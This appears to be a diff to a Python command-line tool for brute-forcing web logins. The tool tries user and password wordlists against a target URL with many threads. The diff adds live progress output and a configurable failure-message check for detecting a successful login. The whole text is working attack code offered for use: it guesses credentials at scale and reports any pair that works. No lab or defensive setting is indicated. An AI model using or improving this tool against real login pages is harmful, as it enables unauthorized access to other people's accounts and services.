@@ -3,12 +3,33 @@ import requests
 from concurrent.futures import ThreadPoolExecutor
 import argparse
 from threading import Lock
+import sys
 
 found_lock = Lock()
 FOUND_FLAG = False# Global flag if found,turn True
 
-def try_login(target_url, username, password, data_template, custom_headers, HTTP_Method):
+# Real-time progress display
+progress_lock = Lock()
+current_progress = {
+    "user_index": 0,
+    "total_users": 0,
+    "current_user": "",
+    "current_password": "",
+    "password_count": 0,
+    "mode": "",
+    "last_update_time": time.time() # control refresh rate
+}
+
+UPDATE_INTERVAL = 0.5 # every 0.5 second refresh
+
+def try_login(target_url, username, password, data_template, custom_headers, HTTP_Method, error_message):
     global FOUND_FLAG
+
+    # 减少锁持有时间
+    with progress_lock:
+        current_progress["current_user"] = username
+        current_progress["current_password"] = password
+
     # if found, stop
     with found_lock:
         if FOUND_FLAG:
@@ -25,16 +46,13 @@ def try_login(target_url, username, password, data_template, custom_headers, HTT
         else:
             # other method like PUT/HEAD
             response = requests.request(HTTP_Method, target_url, data=current_data, timeout=5, headers=custom_headers)
+
         # determine whether it is successful
-        # firstly, according to HTTP status code
-        """if response.status_code == 302:
-            print(f"\n[!] brute successful!password: {password}")
-            FOUND_FLAG = True"""
-        # secondly, according to HTTP text
         if response.status_code == 200:
-            if "type=\"password\"" not in response.text:
+            if error_message not in response.text:
                 with found_lock:
                     if not FOUND_FLAG:
+                        print("\r" + " " * 150 + "\r", end="", flush=True)
                         print(f"\n[!] brute successful! credential is {username}:{password}")
                         FOUND_FLAG = True
                         return True
@@ -47,6 +65,8 @@ def try_login(target_url, username, password, data_template, custom_headers, HTT
         pass
 
     return False
+
+
 
 def load_passwords(pass_list_path, batch_size=1000):
     # The generator method is used to read passwords, saving memory
@@ -77,6 +97,23 @@ def load_users(userfile):
         print(f"[X] the user dictionary {userfile} don't find")
         raise
 
+def print_progress():
+    with progress_lock:
+        if current_progress["mode"] == "USER":
+            progress_msg = (
+                f"\r[*] User [{current_progress['user_index']}/{current_progress['total_users']}]: "
+                f"{current_progress['current_user']} | "
+                f"Password: {current_progress['current_password']:<30}"
+            )
+        else:  # PASS mode
+            progress_msg = (
+                f"\r[*] Password Count: {current_progress['password_count']:<8} | "
+                f"User: {current_progress['current_user']:<20} | "
+                f"Password: {current_progress['current_password']:<30}"
+            )
+    sys.stdout.write(progress_msg)
+    sys.stdout.flush()
+
 def main():
     # --- Set command line parameters ---
     parser = argparse.ArgumentParser(description="Multi-threaded login brute force tool")
@@ -88,6 +125,7 @@ def main():
     parser.add_argument("-d", "--data", required=True, help="POST data format.(e.g. -d \"user=~USER~&pass=~PASS~\")")
     parser.add_argument("-m", "--method", default="POST", help="HTTP Method (default: POST)")
     parser.add_argument("-M","--Mode",default="USER", help="Attack Mode: 'USER' (User-centric) or 'PASS' (Password-centric). Default: USER")
+    parser.add_argument("-F","--error_message", help="Error Message(e.g., Login failed)")
 
     # user  parameters group (mutually exclusive: only one can be selected)
     user_group = parser.add_mutually_exclusive_group(required=True)
@@ -106,7 +144,6 @@ def main():
     data_template = args.data
     HTTP_Method = args.method.upper()
     Mode = args.Mode.upper()
-
     start_time = time.time()
 
     print(f"[*] target url:{target_url}")
@@ -139,13 +176,25 @@ def main():
     elif args.userfile:
         users = load_users(args.userfile)
         print(f"[*] load {len(users)} user")
-    # Open a thread pool, assuming ten threads
+
+    with progress_lock:
+        current_progress["total_users"] = len(users)
+        current_progress["mode"] = Mode
+
+    error_message = None
+    if args.error_message:
+        error_message = args.error_message
+        print(f"[*] Error message: {error_message}")
+    else:
+        error_message = "type=\"password\""
+        print(f"[*] Error message: {error_message}")
 
     # User-centric one user -> all password
     if Mode == "USER":
             for index, current_user in enumerate(users, start=1):
                 with found_lock:
                     if FOUND_FLAG:
+                        print("\r" + " " * 150 + "\r", end="", flush=True)
                         print("task over!")
                         break
 
@@ -160,8 +209,20 @@ def main():
 
                             futures = []
                             for current_pass in password_batch:
+                                with progress_lock:
+                                    current_progress["user_index"] = index
+                                    current_progress["current_user"] = current_user
+                                    current_progress["current_password"] = current_pass
+                                    current_progress["password_count"] += 1
+                                    should_update = time.time() - current_progress["last_update_time"] > UPDATE_INTERVAL
+                                    if should_update:
+                                        current_progress["last_update_time"] = time.time()
+
+                                if should_update:
+                                    print_progress()
+
                                 future = executor.submit(try_login, target_url, current_user, current_pass,
-                                                         data_template, final_headers, HTTP_Method)
+                                                         data_template, final_headers, HTTP_Method, error_message)
                                 futures.append(future)
 
                             for future in futures:
@@ -178,17 +239,26 @@ def main():
                 for pass_index, password_batch in enumerate(load_passwords(pass_list_path)):
                     with found_lock:
                         if FOUND_FLAG:
+                            print("\r" + " " * 150 + "\r", end="", flush=True)
                             print("[*] find credentials, stop!")
                             break
-
-                    if pass_index % 100 == 0 and pass_index > 0:
-                        print(f"[*] tried  {pass_index * 1000} password...")
 
                     futures = []
                     for current_pass in password_batch:
                         for current_user in users:
+                            with progress_lock:
+                                current_progress["current_password"] = current_pass
+                                current_progress["current_user"] = current_user
+                                current_progress["password_count"] += 1
+                                should_update = time.time() - current_progress["last_update_time"] > UPDATE_INTERVAL
+                                if should_update:
+                                    current_progress["last_update_time"] = time.time()
+
+                            if should_update:
+                                print_progress()
+
                             future = executor.submit(try_login, target_url, current_user, current_pass,
-                                                             data_template, final_headers, HTTP_Method)
+                                                             data_template, final_headers, HTTP_Method, error_message)
                             futures.append(future)
 
                     for future in futures:
@@ -197,9 +267,9 @@ def main():
                 print(f"[X] the password dictionary {pass_list_path} don't find")
                 return
 
-
         with found_lock:
             if not FOUND_FLAG:
+                print("\r" + " " * 150 + "\r", end="", flush=True)
                 print("\n[*] brute over, don't find credentials")
 
     elapsed_time = time.time() - start_time
